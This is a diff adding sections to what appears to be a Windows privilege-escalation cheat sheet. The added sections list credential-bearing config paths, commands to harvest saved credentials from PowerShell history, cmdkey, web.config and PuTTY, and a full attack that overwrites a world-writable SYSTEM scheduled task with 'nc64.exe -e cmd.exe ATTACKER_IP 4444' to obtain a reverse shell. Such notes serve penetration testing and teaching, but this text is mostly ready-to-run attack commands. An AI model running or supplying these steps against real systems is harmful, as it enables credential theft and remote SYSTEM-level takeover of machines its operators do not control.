@@ -776,3 +776,38 @@ PS> Get-Content .\cert_templates.txt -Raw `
 | Select-String -Pattern "Template\[.*?\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
 | Foreach-Object {$_ -replace "aaaa", "`n"}
 ```
+
+# config
+```zsh
+# unattended installations on Windows
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+# IIS
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+```zsh
+# Powershell
+cmd> cmdtype %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+PS > Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+# Credential Manager
+cmd> cmdkey /list
+cmd> runas /savecred /user:admin cmd.exe
+cmd> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+# PuTTy
+PS > reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+```zsh
+cmd> schtasks /query /tn TestVulnTask /fo list /v
+cmd> icacls c:\TestTasks\TestSchTask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)
+                    
+cmd> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > c:\TestTasks\TestSchTask.bat
+Attacker Linux Machine> nc -lvp 4444
+C:\> schtasks /run /tn TestVulnTask
+```
